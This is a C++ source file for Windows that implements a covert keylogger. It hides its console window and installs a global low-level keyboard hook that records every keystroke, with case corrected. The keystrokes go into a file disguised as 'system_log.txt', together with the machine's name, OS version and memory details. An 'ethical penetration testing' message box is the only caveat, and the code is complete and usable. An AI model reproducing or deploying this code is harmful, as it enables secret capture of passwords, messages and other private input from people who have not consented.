#include <Windows.h>
#include <fstream>
#include <string>
#include <Lmcons.h> // For UNLEN constant
#include <ctime>

// Hide console window
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

std::string logPath = "system_log.txt";
HHOOK keyboardHook;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        
        std::ofstream logFile(logPath, std::ios::app);
        if (logFile.is_open()) {
            if (wParam == WM_KEYDOWN) {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                
                // Check shift key state
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                WORD asciiChar;
                char key;
                if (ToAscii(pKey->vkCode, pKey->scanCode, keyboardState, &asciiChar, 0) == 1) {
                    key = static_cast<char>(asciiChar);
                    // Only modify case for alphabetic characters
                    if (isalpha(key)) {
                        if ((shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn)) {
                            key = toupper(key);
                        } else {
                            key = tolower(key);
                        }
                    }
                    logFile << key;
                }
            }
            logFile.close();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void CollectSystemInfo() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // Get OS version
    OSVERSIONINFO osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osInfo);
    
    // Get memory status
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    // Get computer and user name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    // char userName[UNLEN + 1];
    // DWORD userNameSize = sizeof(userName);
    // GetUserNameA(userName, &userNameSize);

    time_t now = time(0);
    char* dt = ctime(&now);
    
    std::ofstream logFile(logPath, std::ios::app);
    if (logFile.is_open()) {
        logFile << "\n=== System Information ===\n";
        logFile << "\nDate: " << dt << "\n";
        logFile << "Computer Name: " << computerName << "\n";
        // logFile << "User Name: " << userName << "\n";
        logFile << "OS Version: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << "\n";
        logFile << "Build Number: " << osInfo.dwBuildNumber << "\n";
        logFile << "Processor Architecture: " << sysInfo.wProcessorArchitecture << "\n";
        logFile << "Number of Processors: " << sysInfo.dwNumberOfProcessors << "\n";
        logFile << "Page Size: " << sysInfo.dwPageSize << " bytes\n";
        logFile << "Total Physical Memory: " << memInfo.ullTotalPhys/1024/1024 << " MB\n";
        logFile << "Available Physical Memory: " << memInfo.ullAvailPhys/1024/1024 << " MB\n";
	logFile << "\nkeystrokes are: " << "\n";
        logFile.close();
    }
}

int main() {
    // Ethical use disclaimer
    MessageBoxA(NULL, 
        "This software is for educational and ethical penetration testing purposes only.\n"
        "Unauthorized use is strictly prohibited.", 
        "Ethical Warning", 
        MB_OK | MB_ICONWARNING);

    CollectSystemInfo();
    
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}